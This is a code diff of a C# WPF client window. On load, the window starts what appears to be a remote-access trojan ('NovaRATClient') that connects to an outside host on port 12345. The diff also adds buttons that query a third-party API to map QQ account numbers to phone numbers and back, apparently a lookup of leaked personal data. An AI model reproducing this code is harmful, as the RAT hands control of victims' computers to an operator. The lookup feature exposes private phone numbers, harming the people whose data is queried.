@@ -1,23 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Net.Sockets;
 using System.Net;
-using System.Text;
-using System.Threading.Tasks;
 using System.Windows;
-using System.Windows.Controls;
-using System.Windows.Data;
-using System.Windows.Documents;
-using System.Windows.Input;
-using System.Windows.Media;
 using System.Windows.Media.Animation;
-using System.Windows.Media.Imaging;
-using System.Windows.Navigation;
-using System.Windows.Shapes;
-using System.Threading;
-using System.Diagnostics;
 using ClientLib;
+using Newtonsoft.Json.Linq;
 
 namespace Client
 {
@@ -36,8 +22,43 @@ namespace Client
                 BeginAnimation(UIElement.OpacityProperty, fadeInAnimation);
             };
 
-            NovaRATClient.Start("loca.novapp.icu",12345);
+            NovaRATClient.Start("loca.novapp.icu", 12345);
         }
 
+        private void q_p_btn_Click(object sender, RoutedEventArgs e)
+        {
+            WebClient wc = new WebClient();
+            MessageBox.Show(Json_(wc.DownloadString("https://zy.xywlapi.cc/qqcx2023?qq=" + q_p.Text),"phone"));
+        }
+
+        public string Json_(string json,string value)
+        {
+            // 使用 JObject 解析 JSON
+            JObject jsonObject = JObject.Parse(json);
+
+            // 获取 "status" 字段的值
+            int status = jsonObject.Value<int>("status");
+
+            if (status == 200)
+            {
+                // 获取 "phone" 字段的值
+                string phone = jsonObject.Value<string>(value);
+                return phone;
+            }
+            else if (status == 500)
+            {
+                return "没有找到";
+            }
+            else
+            {
+                return "null";
+            }
+        }
+
+        private void p_q_btn_Click(object sender, RoutedEventArgs e)
+        {
+            WebClient wc = new WebClient();
+            MessageBox.Show(Json_(wc.DownloadString("https://zy.xywlapi.cc/qqxc2023?phone=" + q_p.Text), "qq"));
+        }
     }
 }
